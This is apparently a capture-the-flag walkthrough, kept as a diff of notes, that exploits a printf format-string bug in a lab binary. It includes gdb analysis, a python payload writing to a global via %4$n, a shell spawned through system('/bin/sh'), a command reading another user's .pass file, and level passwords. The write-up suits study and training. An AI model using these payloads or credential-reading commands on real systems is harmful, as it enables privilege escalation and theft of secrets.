@@ -1,0 +1,130 @@
+login : pw
+	level3 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+scp -P 4242 level3@192.168.1.20:~/level3 .
+
+disas main
+	call v
+
+disas v
+	=> stack allocated = 0x218
+	=> esp + 0x8 => x 0x8049860 => stdin
+	=> esp + 0x4 => 0x200 => 512
+	=> esp => ebp - 0x208 => 520 (buffer size)
+	fgets called
+		=> fgets is not vulnerable
+	printf called with buffer as only param
+	cmp 0x40 with data in 0x804988c
+		=> x 0x804988c => m = 0 (global var)
+		=> if not equal => leave
+		=> else call fwrite(0x8048600, 0x1, 0xc, ds:0x8049880)
+			=> 0x8048600 => x/s 0x8048600 => "Wait what?!\n"
+			=> ds:0x8049880 => x 0x8049880 => stdout
+		=> call system with 0x804860d
+			=> 0x804860d => x/s 0x804860d => "/bin/sh"
+
+Summary:
+	fgets(buf, ...) => printf(buf) => if global var m == 0x40 => system("/bin/sh")
+
+Exploit can only be in printf called with a var as string:
+	=> A quick research on internet
+		=> First result: format string attack
+			=> https://owasp.org/www-community/attacks/Format_string_attack
+
+./level3
+	%s
+		=> segfault, it cant read anything
+		=> Looks like it's vulnerable
+
+b *v+49
+	=> Right before printf call
+b *v+54
+	=> Right after printf call
+run
+	ab  %p  %p  %p  %p  
+		=> 4 bytes each sequence for clarity
+		=> a is 61 in hex
+		=> breakpoint hit
+
+i r eax
+	=> 0xbffffc00
+	=> Buffer start address
+
+x/32xw $esp
+	=> 0xbffffbf0:	0xbffffc00	0x00000200	0xb7fd1ac0	0xb7ff37d0
+	=> 0x20206261	0x20207025	0x20207025	0x20207025
+		=> buf starts at ebp-208, esp size is 0x218
+			=> 0x218 - 0x208 = 16
+				=> Our 'a' are indeed at the eax start address which is 16 bytes after esp
+		=> 20 in hex is space | 70 is p | 25 is percentage
+			=> Note the little endian
+
+continue
+	=> ab  0x200  0xb7fd1ac0  0xb7ff37d0  0x20206261
+		=> The printf function printed each address starting from esp+4 (from v() point of view)
+
+Now I need to modify m value:
+	=> https://axcheron.github.io/exploit-101-format-strings/
+		=> After reading, 2 interesting things:
+			=> $ can be used to select the address number within the stack
+			=> n can be used to write an int value into an int pointer
+
+Lets experiment $ first:
+	r
+		%2$p %3$p %4$p
+			=> 0xb7fd1ac0 0xb7ff37d0 0x70243225
+	x/32xw $esp
+		=> 0xbffffbf0:	0xbffffc00	0x00000200	0xb7fd1ac0	0xb7ff37d0
+		=> 0xbffffc00:	0x70243225	0x24332520	0x34252070	0x000a7024
+			=> last time, we started at 0x200 address
+			=> Here we started at the one following, due to the %2$
+			=> We see that $4p is used to access the first 4 bytes of the string
+
+p &m
+	=> (<data variable, no debug info> *) 0x804988c
+		=> m address because I want to write into it
+
+Lets experiment with n now:
+
+python -c 'print "\x8c\x98\x04\x08" + "%4$p"' > /tmp/a
+	=> little endian
+
+r < /tmp/a
+	=> �0x804988c
+	=> address of m is properly displayed
+
+python -c 'print "\x8c\x98\x04\x08" + "%4$n"' > /tmp/a
+
+r < /tmp/a
+
+p m
+	=> 4
+		=> We have written the address first which contain 4 bytes
+
+python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/a
+
+r < /tmp/a
+	=> Wait what?!
+
+Now we need to do it from outside gdb
+	=> ./level3 < /tmp/a
+		=> Wait what?!
+			=> No shell
+				=> shell is open until it reads an EOF
+				=> https://stackoverflow.com/questions/67438144/system-bin-sh-closes-immediately-when-input-given-through-pipe
+
+man cat
+	=> With no FILE, or when FILE is -, read standard input.
+
+cat /tmp/a - | ./level3
+	=> shell not closed
+
+whoami
+	=> level4
+
+cat /home/user/level4/.pass
+	=> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+
+
+
